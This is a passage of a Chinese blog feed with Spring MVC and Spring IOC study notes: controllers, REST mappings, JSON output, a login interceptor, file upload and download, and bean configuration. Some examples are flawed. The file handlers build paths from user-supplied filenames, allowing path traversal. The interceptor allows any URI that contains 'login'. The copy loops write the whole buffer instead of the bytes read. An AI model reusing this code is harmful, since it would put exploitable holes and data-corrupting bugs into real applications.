而不是org.springframework.stereotype.Controller，这个Controller是注解用的public class Hello2Controller implements Controller &#123;    @Override    public ModelAndView handleRequest(HttpServletRequest request, HttpServletResponse response) throws Exception &#123;        // 模型和视图        ModelAndView mv = new ModelAndView();        // 封装对象        mv.addObject(&quot;msg&quot;, &quot;HelloSpringMVC&quot;);        // 封装要跳转的对象        mv.setViewName(&quot;hello2&quot;);        System.out.println(&quot;---&quot;);        return mv;    &#125;&#125;</code></pre><h2 id="三、使用注解开发SpringMVC"><a href="#三、使用注解开发SpringMVC" class="headerlink" title="三、使用注解开发SpringMVC"></a>三、使用注解开发SpringMVC</h2><p>web.xml中的配置不变，springmvc-config.xml中的配置如下：</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;       xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;       xmlns:context=&quot;http://www.springframework.org/schema/context&quot;       xmlns:mvc=&quot;http://www.springframework.org/schema/mvc&quot;       xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans        https://www.springframework.org/schema/beans/spring-beans.xsd        http://www.springframework.org/schema/context        https://www.springframework.org/schema/context/spring-context.xsd http://www.springframework.org/schema/mvc https://www.springframework.org/schema/mvc/spring-mvc.xsd&quot;&gt;    &lt;!-- 自动扫描包，让指定包下的注解生效，由IOC容器统一管理 --&gt;    &lt;context:component-scan base-package=&quot;org.yuye757.controller&quot;/&gt;    &lt;!-- 配置对url的检查，将一些静态资源交给默认的Servlet处理，非静态资源才让DispatcherServlet处理 --&gt;    &lt;mvc:default-servlet-handler/&gt;    &lt;!-- 开启注解 --&gt;    &lt;mvc:annotation-driven/&gt;    &lt;!-- 视图解析器，配置了前后缀，以后重定向到某个jsp时就可以不用写前后缀了 --&gt;    &lt;bean id=&quot;internalResourceViewResolver&quot; class=&quot;org.springframework.web.servlet.view.InternalResourceViewResolver&quot;&gt;        &lt;!-- 前缀 --&gt;        &lt;property name=&quot;prefix&quot; value=&quot;/WEB-INF/jsp/&quot;/&gt;        &lt;!-- 后缀 --&gt;        &lt;property name=&quot;suffix&quot; value=&quot;.jsp&quot;/&gt;    &lt;/bean&gt;&lt;/beans&gt;</code></pre><pre><code class="java">package org.yuye757.controller;import org.springframework.stereotype.Controller;import org.springframework.ui.Model;import org.springframework.web.bind.annotation.RequestMapping;@Controller@RequestMapping(&quot;/hello&quot;) // 不写的话，就直接走方法的mapping uripublic class HelloController &#123;    @RequestMapping(&quot;/h1&quot;) // 如果没有配置restful，这里一定要写，不写则找不到这个方法的uri    // uil为：localhost:8080/warName/hello/h1    public String index(Model model)&#123;        // 封装数据        model.addAttribute(&quot;msg&quot;, &quot;Hello, SpringMVC Annotation!&quot;);        String viewName = &quot;hello&quot;;        // 加了@Controller注解的类下的所有加了@RequestMapping的方法        // 若返回的类型是字符串，且能够找到对应的jsp，就会被视图解析器处理        // /WEB-INF/jsp/$&#123;viewName&#125;.jsp        return viewName;    &#125;&#125;</code></pre><h2 id="四、restful风格的uri"><a href="#四、restful风格的uri" class="headerlink" title="四、restful风格的uri"></a>四、restful风格的uri</h2><p>jsp不支持DELETE、PUT类型的方法，以下那两个方法看看即可。</p><pre><code class="java">package org.yuye757.controller;import org.springframework.stereotype.Controller;import org.springframework.ui.Model;import org.springframework.web.bind.annotation.*;@Controller@RequestMapping(&quot;/restful&quot;)public class RestfulController &#123;    // 原来的方式：localhost:8080/warName/test?a=1&amp;b=2    @RequestMapping(&quot;/test&quot;)    public String test(Model model, int a, int b)&#123;        int res = a + b;        model.addAttribute(&quot;msg&quot;, res);        return &quot;test&quot;;    &#125;    // restful方式：localhost:8080/warName/test/1/2    // @RequestMapping(value = &quot;/test2/&#123;a&#125;/&#123;b&#125;&quot;, method = RequestMethod.GET)    @GetMapping(&quot;/test2/&#123;a&#125;/&#123;b&#125;&quot;)    public String test2(@PathVariable int a, @PathVariable int b, Model model)&#123;        int res = a + b;        model.addAttribute(&quot;msg&quot;, &quot;GET方法：&quot; + res);        return &quot;test&quot;;    &#125;    // restful方式：localhost:8080/warName/test/1/2    // @RequestMapping(value = &quot;/test2/&#123;a&#125;/&#123;b&#125;&quot;, method = RequestMethod.POST)    @PostMapping(&quot;/test2/&#123;a&#125;/&#123;b&#125;&quot;)    public String test3(@PathVariable int a, @PathVariable int b, Model model)&#123;        int res = a - b;        model.addAttribute(&quot;msg&quot;, &quot;POST方法：&quot; + res);        return &quot;test&quot;;    &#125;    // restful方式：localhost:8080/warName/test/1/2    // @RequestMapping(value = &quot;/test2/&#123;a&#125;/&#123;b&#125;&quot;, method = RequestMethod.PUT)    @PutMapping(&quot;/test2/&#123;a&#125;/&#123;b&#125;&quot;)    public String test4(@PathVariable int a, @PathVariable int b, Model model)&#123;        int res = a * b;        model.addAttribute(&quot;msg&quot;, &quot;PUT方法：&quot; + res);        return &quot;test&quot;;    &#125;    // restful方式：localhost:8080/warName/test/1/2    // @RequestMapping(value = &quot;/test2/&#123;a&#125;/&#123;b&#125;&quot;, method = RequestMethod.DELETE)    @DeleteMapping(&quot;/test2/&#123;a&#125;/&#123;b&#125;&quot;)    public String test5(@PathVariable int a, @PathVariable int b, Model model)&#123;        int res = a / b;        model.addAttribute(&quot;msg&quot;, &quot;DELETE方法：&quot; + res);        return &quot;test&quot;;    &#125;&#125;</code></pre><h2 id="五、springmvc使用细节"><a href="#五、springmvc使用细节" class="headerlink" title="五、springmvc使用细节"></a>五、springmvc使用细节</h2><h3 id="1、转发和重定向"><a href="#1、转发和重定向" class="headerlink" title="1、转发和重定向"></a>1、转发和重定向</h3><p>可以在方法中加入request、response参数，使用servlet原生的转发或重定向方式。</p><p>在springmvc中可以这样：</p><pre><code class="java">package org.yuye757.controller;import org.springframework.stereotype.Controller;import org.springframework.web.bind.annotation.GetMapping;import org.springframework.web.bind.annotation.PostMapping;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.servlet.ModelAndView;@Controller@RequestMapping(&quot;/modelTest&quot;)public class ModelTest1 &#123;    @PostMapping(value = &quot;/test1&quot;)    public ModelAndView test()&#123;        ModelAndView mv = new ModelAndView();        // 重定向：redirect        mv.setViewName(&quot;redirect:/restful/test2/10/5&quot;);                // 转发：forward        // mv.setViewName(&quot;forward:/restful/test2/10/5&quot;);        return mv;    &#125;&#125;</code></pre><p><font color="Red">注意：通过这种方式的转发会带上方法的类型，如POST、PUT。但是重定向不会，默认是GET方法。因为重定向实际上是重新发起了一次请求，因此默认是GET。</font></p><h3 id="2、参数"><a href="#2、参数" class="headerlink" title="2、参数"></a>2、参数</h3><pre><code class="java">package org.yuye757.controller;import org.springframework.stereotype.Controller;import org.springframework.ui.Model;import org.springframework.web.bind.annotation.GetMapping;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.bind.annotation.RequestParam;import org.yuye757.pojo.User;@Controller@RequestMapping(&quot;/user&quot;)public class UserController &#123;    @GetMapping(&quot;/t1&quot;)    // 若有@RequestParam，则前端传入的参数以注解里面的名字为准，此时变量名失效。没有的话就只能用变量名。    // 建议都加上@RequestParam，这样可以很明显的告诉别人这是要从前端接收的参数    // http://localhost:8080/user/t1?username=123456    public String test1(Model model, @RequestParam(&quot;username&quot;) String name)&#123;        System.out.println(&quot;前端接收到的参数：&quot; + name);        model.addAttribute(&quot;msg&quot;, name);        return &quot;test&quot;;    &#125;    /*    1、若参数为普通类型，则通过方法的参数名字和url的参数名字匹配    2、若参数为对象，则会调用无参构造方法，再按照对象属性名和url的参数名去匹配，匹配到的就会调用其setter方法       和url参数名没匹配上的属性或没有setter方法的属性则没有值       若没有无参构造方法，则调用有参构造方法。总之把pojo类的构造方法写全是最好的。     */    // http://localhost:8080/user/t2?id=1&amp;name=我是一个名字&amp;age=12    @GetMapping(&quot;/t2&quot;)    public String test2(User user, Model model)&#123;        String s = user.toString();        System.out.println(s);        model.addAttribute(&quot;msg&quot;, s);        return &quot;test&quot;;    &#125;&#125;</code></pre><h3 id="3、乱码"><a href="#3、乱码" class="headerlink" title="3、乱码"></a>3、乱码</h3><p>配置web.xml</p><pre><code class="xml">&lt;!-- 之前我们自己写filter来解决乱码问题 --&gt;&lt;!-- 在springmvc中，他给我们写了一个过滤器来解决乱码 --&gt;&lt;filter&gt;    &lt;filter-name&gt;encodingFilter&lt;/filter-name&gt;    &lt;filter-class&gt;org.springframework.web.filter.CharacterEncodingFilter&lt;/filter-class&gt;    &lt;init-param&gt;        &lt;param-name&gt;encoding&lt;/param-name&gt;        &lt;param-value&gt;utf-8&lt;/param-value&gt;    &lt;/init-param&gt;&lt;/filter&gt;&lt;filter-mapping&gt;    &lt;filter-name&gt;encodingFilter&lt;/filter-name&gt;    &lt;!-- 注意这里要用/*，之前上面说了/*可以把jsp资源也包括在处理范围类 --&gt;    &lt;url-pattern&gt;/*&lt;/url-pattern&gt;&lt;/filter-mapping&gt;</code></pre><h3 id="4、返回值"><a href="#4、返回值" class="headerlink" title="4、返回值"></a>4、返回值</h3><p>（1）让方法返回一个纯字符串给前端，而不是走视图解析器</p><ul><li>在类上面加<code>@RestController</code>，这个注解可以使类中的所有方法都返回字符串，而不是走视图解析器</li><li>在方法上面加<code>@ResponseBody</code>注解</li></ul><p>（2）返回json字符串</p><ul><li>使用jackson包</li></ul><pre><code class="java">package org.yuyr757.controller;import com.fasterxml.jackson.core.JsonProcessingException;import com.fasterxml.jackson.databind.ObjectMapper;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.bind.annotation.ResponseBody;import org.springframework.web.bind.annotation.RestController;import org.yuyr757.User.User;// @RestController这个注解可以使类中的所有方法都返回字符串，而不是走视图解析器@RestControllerpublic class UserController &#123;    @ResponseBody // 使用这个注解，则不会走视图解析器，而是直接返回一个字符串    // produces = &quot;application/json;charset=utf-8&quot;，加上这个指明返回的页面格式和编码    @RequestMapping(value = &quot;/user/j1&quot;)    public String json2() throws JsonProcessingException &#123;        User user = new User(1, &quot;你好&quot;, 2);        ObjectMapper objectMapper = new ObjectMapper(); // 使用jackson包        String s = objectMapper.writeValueAsString(user);        return s;    &#125;&#125;</code></pre><ul><li>使用fastjson包</li></ul><pre><code class="java">@RequestMapping(&quot;/user/j4&quot;)public String json4() throws JsonProcessingException &#123;    List&lt;Object&gt; list = new ArrayList&lt;&gt;();    User user = new User(1, &quot;名字&quot;, 2);    list.add(user);    // 原生日期格式    Date date = new Date();    list.add(date);    // 通过java.text.DateFormat的格式化    ObjectMapper objectMapper = new ObjectMapper();    SimpleDateFormat simpleDateFormat = new SimpleDateFormat(&quot;yyyy-MM-dd HH:mm:ss&quot;);    list.add(simpleDateFormat.format(date));    // 通过jackson格式化    ObjectMapper objectMapper2 = new ObjectMapper();    objectMapper2.setDateFormat(simpleDateFormat);    String s2 = objectMapper2.writeValueAsString(date);    list.add(s2);    return JSON.toJSONString(list, &quot;yyyy-MM-dd HH:mm:ss&quot;); // 使用fastjson&#125;</code></pre><p>（3）使用jackson包返回json字符串到前端后乱码问题</p><ul><li>在<code>@RequestMapping</code>注解里面加入<code>produces</code>参数</li></ul><pre><code class="java">@RequestMapping(value = &quot;/user/j1&quot;, produces = &quot;application/json;charset=utf-8&quot;)</code></pre><ul><li>在springmvc-config.xml中配置jackson独有的配置（建议使用）</li></ul><pre><code class="xml">&lt;!--Jackson乱码解决--&gt;&lt;mvc:annotation-driven&gt;    &lt;mvc:message-converters&gt;        &lt;bean class=&quot;org.springframework.http.converter.StringHttpMessageConverter&quot;&gt;            &lt;constructor-arg value=&quot;UTF-8&quot;/&gt;        &lt;/bean&gt;        &lt;bean class=&quot;org.springframework.http.converter.json.MappingJackson2HttpMessageConverter&quot;&gt;            &lt;property name=&quot;objectMapper&quot;&gt;                &lt;bean class=&quot;org.springframework.http.converter.json.Jackson2ObjectMapperFactoryBean&quot;&gt;                    &lt;property name=&quot;failOnEmptyBeans&quot; value=&quot;false&quot;/&gt;                &lt;/bean&gt;            &lt;/property&gt;        &lt;/bean&gt;    &lt;/mvc:message-converters&gt;&lt;/mvc:annotation-driven&gt;</code></pre><p>（4）在前端使用json</p><pre><code class="html">&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;title&gt;Title&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;script type=&quot;text/javascript&quot;&gt;    var user = &#123;        name: &quot;yuyr757&quot;,        age: 2,        sex: &quot;男&quot;    &#125;;    console.log(user);    console.log(&quot;---------将对象解析为json----------&quot;);    var value = JSON.stringify(user);    console.log(value);    console.log(&quot;---------将json解析为对象----------&quot;);    var object = JSON.parse(value);    console.log(object);&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><h2 id="六、拦截器和过滤器"><a href="#六、拦截器和过滤器" class="headerlink" title="六、拦截器和过滤器"></a>六、拦截器和过滤器</h2><p><strong>拦截器</strong>：拦截器只会拦截访问的控制器方法，如果访问的是jsp、html、css、image、js是不会被拦截的。<font color="Red">实现了<code>HandlerInterceptor</code>接口的类就是拦截器。拦截器是AOP思想的一个具体应用。</font></p><p><strong>过滤器</strong>：在web.xml中配置的Filter就是过滤器，url_pattern配置了<code>/*</code>会对所有资源进行过滤。</p><p>登录拦截示例：</p><pre><code class="java">package org.yuye757.controller;import org.springframework.stereotype.Controller;import org.springframework.web.bind.annotation.RequestMapping;import javax.servlet.http.HttpSession;@Controllerpublic class LoginController &#123;    @RequestMapping(&quot;/login&quot;)    public String login(String username, String password, HttpSession session)&#123;        session.setAttribute(&quot;username&quot;, username);        return &quot;main&quot;;    &#125;    @RequestMapping(&quot;/goLogin&quot;)    public String goLogin()&#123;        return &quot;login&quot;;    &#125;    @RequestMapping(&quot;/main&quot;)    public String main()&#123;        return &quot;main&quot;;    &#125;    @RequestMapping(&quot;/logout&quot;)    public String logout(HttpSession session)&#123;        session.removeAttribute(&quot;username&quot;);        return &quot;redirect:/main&quot;;    &#125;&#125;</code></pre><pre><code class="java">package org.yuye757.interceptor;import org.springframework.web.servlet.HandlerInterceptor;import org.springframework.web.servlet.ModelAndView;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;import javax.servlet.http.HttpSession;public class LoginInterceptor implements HandlerInterceptor &#123;    // return true即放行，return false则阻断    @Override    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception &#123;        HttpSession session = request.getSession();        System.out.println(request.getRequestURI());        if (request.getRequestURI().contains(&quot;Login&quot;) || request.getRequestURI().contains(&quot;login&quot;))&#123;            return true;        &#125;        if (session.getAttribute(&quot;username&quot;) != null)&#123;            return true;        &#125;        request.getRequestDispatcher(&quot;/WEB-INF/jsp/login.jsp&quot;).forward(request, response);        return false;    &#125;    // 下面两个不会返回值，一般用于其他处理，如日志，或者直接删掉也可以    @Override    public void postHandle(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView) throws Exception &#123;    &#125;    @Override    public void afterCompletion(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex) throws Exception &#123;    &#125;&#125;</code></pre><pre><code class="xml">&lt;mvc:interceptors&gt;    &lt;mvc:interceptor&gt;        &lt;mvc:mapping path=&quot;/**&quot;/&gt;        &lt;bean class=&quot;org.yuye757.interceptor.LoginInterceptor&quot;/&gt;    &lt;/mvc:interceptor&gt;&lt;/mvc:interceptors&gt;</code></pre><h2 id="七、文件上传和下载"><a href="#七、文件上传和下载" class="headerlink" title="七、文件上传和下载"></a>七、文件上传和下载</h2><pre><code class="java">package org.yuye757.controller;import org.springframework.stereotype.Controller;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.bind.annotation.RequestParam;import org.springframework.web.multipart.commons.CommonsMultipartFile;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;import javax.servlet.http.HttpSession;import java.io.*;import java.net.URLEncoder;@Controllerpublic class FileUploader &#123;    @RequestMapping(&quot;/upload&quot;)    public String upload(@RequestParam(&quot;file&quot;) CommonsMultipartFile file, HttpSession session) throws IOException &#123;        String filename = file.getOriginalFilename();        if (&quot;&quot;.equals(filename))&#123;            return &quot;redirect:/index.jsp&quot;;        &#125;        System.out.println(&quot;上传文件名：&quot; + filename);        // 上传路径保存设置        String path = session.getServletContext().getRealPath(&quot;/WEB-INF/upload&quot;);        // 如果路径不存在，则创建一个        File realPath = new File(path);        if (!realPath.exists())&#123;            realPath.mkdir();        &#125;        System.out.println(&quot;上传文件保存地址：&quot; + realPath);        // 创建流        InputStream is = file.getInputStream();        OutputStream os = new FileOutputStream(realPath + &quot;\\&quot; + filename);        // 读写        int len = 0;        byte[] buffer = new byte[1024];        while((len = is.read(buffer)) &gt; 0)&#123;            os.write(buffer, 0, buffer.length);            os.flush();        &#125;        os.close();        is.close();        return &quot;redirect:/index.jsp&quot;;    &#125;    @RequestMapping(&quot;/upload2&quot;)    public String upload2(@RequestParam(&quot;file&quot;) CommonsMultipartFile file, HttpSession session) throws IOException &#123;        String filename = file.getOriginalFilename();        if (&quot;&quot;.equals(filename))&#123;            return &quot;redirect:/index.jsp&quot;;        &#125;        System.out.println(&quot;上传文件名：&quot; + filename);        // 上传路径保存设置        String path = session.getServletContext().getRealPath(&quot;/WEB-INF/upload&quot;);        // 如果路径不存在，则创建一个        File realPath = new File(path);        if (!realPath.exists())&#123;            realPath.mkdir();        &#125;        System.out.println(&quot;上传文件保存地址：&quot; + realPath);        // 通过CommonsMultipartFile的方法直接写入文件        file.transferTo(new File(path + &quot;/&quot; + filename));        return &quot;redirect:/index.jsp&quot;;    &#125;    @RequestMapping(&quot;/download1&quot;)    public void download1(HttpServletRequest request, HttpServletResponse response, String filename) throws IOException &#123;        String path = request.getSession().getServletContext().getRealPath(&quot;/WEB-INF/upload&quot;);        response.reset(); // 设置页面不缓存，清空buffer        response.setCharacterEncoding(&quot;utf-8&quot;);        response.setContentType(&quot;multipart/form-data&quot;);        // 设置响应头        response.setHeader(&quot;Content-Disposition&quot;, &quot;attachment;filename=&quot; + URLEncoder.encode(filename, &quot;utf-8&quot;));        File file = new File(path + &quot;\\&quot; + filename);        System.out.println(&quot;下载文件为：&quot; + file.toString());        // 读取文件流        InputStream is = new FileInputStream(file);        // 输出文件流        OutputStream os = response.getOutputStream();        // 读写        int len = 0;        byte[] buffer = new byte[1024];        while((len = is.read(buffer)) &gt; 0)&#123;            os.write(buffer, 0, buffer.length);            os.flush();        &#125;        os.close();        is.close();    &#125;&#125;</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;一、回顾Servlet&quot;&gt;&lt;a href=&quot;#一、回顾Servlet&quot; class=&quot;headerlink&quot; title=&quot;一、回顾Servlet&quot;&gt;&lt;/a&gt;一、回顾Servlet&lt;/h2&gt;&lt;pre&gt;&lt;code class=&quot;java&quot;&gt;// 转发，forward</summary>
      
    
    
    
    <category term="java" scheme="https://yury757.github.io/categories/java/"/>
    
    
    <category term="java" scheme="https://yury757.github.io/tags/java/"/>
    
    <category term="spring" scheme="https://yury757.github.io/tags/spring/"/>
    
  </entry>
  
  <entry>
    <title>spring-study</title>
    <link href="https://yury757.github.io/java/spring/Spring-study"/>
    <id>https://yury757.github.io/java/spring/Spring-study</id>
    <published>2021-08-23T16:00:00.000Z</published>
    <updated>2021-08-27T16:51:38.157Z</updated>
    
    <content type="html"><![CDATA[<p>代码地址：<a href="https://github.com/yury757/SpringStudy">yury757/SpringStudy (github.com)</a></p><p><font color="Red">spring：约定大于配置！</font></p><h2 id="一、IOC（控制反转）"><a href="#一、IOC（控制反转）" class="headerlink" title="一、IOC（控制反转）"></a>一、IOC（控制反转）</h2><h3 id="1、什么是IOC"><a href="#1、什么是IOC" class="headerlink" title="1、什么是IOC"></a>1、什么是IOC</h3><p>之前都是我们手动new一个对象（比如new一个Dao层对象），然后使用这个对象的属性的方法。</p><p>而IOC就是不用我们去new这个对象，我们只要定义一些配置，然后把创建对象的工作交给spring框架处理，我们需要使用时直接把对象从IOC容器中取出来即可。</p><p><font color="Red">因此IOC（控制反转）的含义就是：spring中，对象创建的权利从我们程序员手动创建控制管理，转变为由spring框架去创建控制管理。</font></p><p><font color="Red">DI（依赖注入）的含义就是：spring框架在创建类的实例时，这个类的所有属性需要私有化，并且设置getter、setter方法，spring框架就可以通过setter方法给对应属性注入值。若没有相应的setter方法，则会报错。</font></p><p>配置如下：</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;       xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;       xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans        https://www.springframework.org/schema/beans/spring-beans.xsd&quot;&gt;    &lt;!-- 使用spring来创建对象，在spring中，这些对象都叫做bean --&gt;    &lt;!-- id：唯一id --&gt;    &lt;!-- class：需要new的类型 --&gt;    &lt;!-- property：对象的属性 --&gt;    &lt;!-- property.name：对象属性名 --&gt;    &lt;!-- property.value：对象属性设置值 --&gt;    &lt;bean id=&quot;hello&quot; class=&quot;org.yuyr757.pojo.Hello&quot;&gt;        &lt;property name=&quot;str&quot; value=&quot;spring_value&quot;/&gt;    &lt;/bean&gt;&lt;/beans&gt;</code></pre><p>取出对象的代码如下：</p><pre><code class="java">// 获取spring的上下文对象ApplicationContext context = new ClassPathXmlApplicationContext(&quot;beans.xml&quot;);// 我们的对象都在spring管理，我们要使用的话，直接去spring容器里面取Hello hello = (Hello)context.getBean(&quot;hello&quot;);System.out.println(hello.toString());</code></pre><p>和Mybatis有点像，都是通过配置文件来配置创建对象所需要的东西，然后把创建对象的工作交给框架来做。</p><p><font color="Red">只不过Mybatis是根据接口创建对象，这个对象的类型的java代码我们甚至没写过，而且对象里面只有方法（CRUD）。而spring的创建对象只是单纯的根据我们写好的java类去new一个实例，然后我们需要什么就取什么。</font></p><h3 id="2、通过bean创建对象的四种方式"><a href="#2、通过bean创建对象的四种方式" class="headerlink" title="2、通过bean创建对象的四种方式"></a>2、通过bean创建对象的四种方式</h3><pre><code class="xml">&lt;!-- 无参构造，再调用相应属性的setter方法 --&gt;&lt;bean id=&quot;user1&quot; class=&quot;org.yuyr757.pojo.User&quot;&gt;    &lt;property name=&quot;id&quot; value=&quot;1&quot;/&gt;    &lt;property name=&quot;name&quot; value=&quot;test_user_name1&quot;/&gt;&lt;/bean&gt;&lt;!-- 有参构造，使用构造方法参数下标 --&gt;&lt;bean id=&quot;user2&quot; class=&quot;org.yuyr757.pojo.User&quot;&gt;    &lt;constructor-arg index=&quot;0&quot; value=&quot;2&quot;/&gt;    &lt;constructor-arg index=&quot;1&quot; value=&quot;test_user_name2&quot;/&gt;&lt;/bean&gt;&lt;!-- 有参构造，使用构造方法参数类型 --&gt;&lt;!-- 不建议使用 --&gt;&lt;bean id=&quot;user3&quot; class=&quot;org.yuyr757.pojo.User&quot;&gt;    &lt;constructor-arg type=&quot;int&quot; value=&quot;3&quot;/&gt;    &lt;constructor-arg type=&quot;java.lang.String&quot; value=&quot;test_user_name3&quot;/&gt;&lt;/bean&gt;&lt;!-- 有参构造，使用构造方法参数参数名 --&gt;&lt;bean id=&quot;user4&quot; class=&quot;org.yuyr757.pojo.User&quot;&gt;    &lt;constructor-arg name=&quot;id&quot; value=&quot;4&quot;/&gt;    &lt;constructor-arg name=&quot;name&quot; value=&quot;test_user_name4&quot;/&gt;&lt;/bean&gt;</code></pre><h3 id="3、spring创建对象的时间"><a href="#3、spring创建对象的时间" class="headerlink" title="3、spring创建对象的时间"></a>3、spring创建对象的时间</h3><p><font color="Red">值得注意的是，bean默认为单例模式。对于单例模式的bean，当程序启动时，spring就会立即给帮我们把对象创建好了，而不是等我们调用getBean时创建的。</font></p><pre><code class="java">package org.yuyr757.pojo;public class User &#123;    private int id;    private String name;    public User() &#123;        System.out.println(&quot;调用了无参构造方法&quot;);    &#125;    public User(int id, String name) &#123;        System.out.println(&quot;调用了有参构造方法&quot;);        this.id = id;        this.name = name;    &#125;    public String getName() &#123;        System.out.println(&quot;调用了getName方法&quot;);        return name;    &#125;    public void setName(String name) &#123;        System.out.println(&quot;调用了setName方法&quot;);        this.name = name;    &#125;    public int getId() &#123;        System.out.println(&quot;调用了getId方法&quot;);        return id;    &#125;    public void setId(int id) &#123;        System.out.println(&quot;调用了setId方法&quot;);        this.id = id;    &#125;    @Override    public String toString() &#123;        return &quot;User&#123;&quot; +                &quot;id=&quot; + id +                &quot;, name=&#39;&quot; + name + &#39;\&#39;&#39; +                &#39;&#125;&#39;;    &#125;&#125;</code></pre><pre><code class="java">public class TestHello &#123;    public static final ApplicationContext context;    static&#123;        context = new ClassPathXmlApplicationContext(&quot;beans.xml&quot;); // 在这里打断点调试        // 上面这条语句结束后，就立即打印了下面几句话        // 调用了无参构造方法        // 调用了setId方法        // 调用了setName方法        // 调用了有参构造方法        // 调用了有参构造方法        // 调用了有参构造方法    &#125;        @Test    public void testUser()&#123;        System.out.println(&quot;=============================&quot;);        User user1 = (User)context.getBean(&quot;user1&quot;);        System.out.println(user1.toString());        System.out.println(&quot;=============================&quot;);        User user2 = (User)context.getBean(&quot;user2&quot;);        System.out.println(user2.toString());        System.out.println(&quot;=============================&quot;);        User user3 = (User)context.getBean(&quot;user3&quot;);        System.out.println(user3.toString());        System.out.println(&quot;=============================&quot;);        User user4 = (User)context.getBean(&quot;user4&quot;);        System.out.println(user4.toString());        System.out.println(&quot;=============================&quot;);    &#125;&#125;</code></pre><h3 id="4、spring配置文件"><a href="#4、spring配置文件" class="headerlink" title="4、spring配置文件"></a>4、spring配置文件</h3><h4 id="（1）bean标签"><a href="#（1）bean标签" class="headerlink" title="（1）bean标签"></a>（1）bean标签</h4><ul><li><p><code>id</code>：唯一id，用于获取到这个对象的id</p></li><li><p><code>class</code>：需要new的类型，要写全限定类名</p></li><li><p><code>property</code>：定义对象的属性的标签</p></li><li><p><code>constructor-arg</code>：定义构造函数的标签</p><ul><li><code>name</code>：对象属性名或构造函数的参数名</li><li><code>value</code>：普通值</li><li><code>ref</code>：引用一个bean</li><li><code>array</code>：注入一个数组</li><li><code>list</code>：注入一个列表</li><li><code>map</code>：注入一个映射表</li><li><code>set</code>：注入一个集合</li><li><code>null</code>：注入一个null指针</li><li><code>props</code>：注入一个properties对象</li></ul></li><li><p><code>scope</code>：作用域</p></li></ul><h4 id="（2）import标签"><a href="#（2）import标签" class="headerlink" title="（2）import标签"></a>（2）import标签</h4><p>导入其他bean配置文件。</p><p>适用于团队开发，不同的人开发的bean不同，最终汇总的时候用一个applicationContext.xml引入各个bean.xml即可。</p><pre><code class="xml">&lt;import resource=&quot;beans.xml&quot;/&gt;&lt;import resource=&quot;beans2.xml&quot;/&gt;&lt;import resource=&quot;beans3.xml&quot;/&gt;</code></pre><h3 id="5、注入方式"><a href="#5、注入方式" class="headerlink" title="5、注入方式"></a>5、注入方式</h3><h4 id="（1）普通方式"><a href="#（1）普通方式" class="headerlink" title="（1）普通方式"></a>（1）普通方式</h4><pre><code class="java">package org.yuyr757.pojo;import java.util.*;public class Student &#123;    private String name;    private Address address;    private String[] books;    private List&lt;String&gt; hobbies;    private Map&lt;String, String&gt; card;    private Set&lt;String&gt; games;    private String wife;    private Properties info;    @Override    public String toString() &#123;        return &quot;Student&#123;&quot; +                &quot;name=&#39;&quot; + name + &#39;\&#39;&#39; +                &quot;, address=&quot; + address +                &quot;, books=&quot; + Arrays.toString(books) +                &quot;, hobbies=&quot; + hobbies +                &quot;, card=&quot; + card +                &quot;, games=&quot; + games +                &quot;, info=&quot; + info +                &quot;, wife=&#39;&quot; + wife + &#39;\&#39;&#39; +                &#39;&#125;&#39;;    &#125;    public String getName() &#123;        return name;    &#125;    public void setName(String name) &#123;        this.name = name;    &#125;    public Address getAddress() &#123;        return address;    &#125;    public void setAddress(Address address) &#123;        this.address = address;    &#125;    public String[] getBooks() &#123;        return books;    &#125;    public void setBooks(String[] books) &#123;        this.books = books;    &#125;    public List&lt;String&gt; getHobbies() &#123;        return hobbies;    &#125;    public void setHobbies(List&lt;String&gt; hobbies) &#123;        this.hobbies = hobbies;    &#125;    public Map&lt;String, String&gt; getCard() &#123;        return card;    &#125;    public void setCard(Map&lt;String, String&gt; card) &#123;        this.card = card;    &#125;    public Set&lt;String&gt; getGames() &#123;        return games;    &#125;    public void setGames(Set&lt;String&gt; games) &#123;        this.games = games;    &#125;    public Properties getInfo() &#123;        return info;    &#125;    public void setInfo(Properties info) &#123;        this.info = info;    &#125;    public String getWife() &#123;        return wife;    &#125;    public void setWife(String wife) &#123;        this.wife = wife;    &#125;    public Student() &#123;    &#125;    public Student(String name, Address address, String[] books, List&lt;String&gt; hobbies, Map&lt;String, String&gt; card, Set&lt;String&gt; games, Properties info, String wife) &#123;        this.name = name;        this.address = address;        this.books = books;        this.hobbies = hobbies;        this.card = card;        this.games = games;        this.info = info;        this.wife = wife;    &#125;&#125;</code></pre><pre><code class="java">package org.yuyr757.pojo;public class Address &#123;    private String address;    @Override    public String toString() &#123;        return &quot;Address&#123;&quot; +                &quot;address=&#39;&quot; + address + &#39;\&#39;&#39; +                &#39;&#125;&#39;;    &#125;    public String getAddress() &#123;        return address;    &#125;    public void setAddress(String address) &#123;        this.address = address;    &#125;    public Address() &#123;    &#125;    public Address(String address) &#123;        this.address = address;    &#125;&#125;</code></pre><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;       xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;       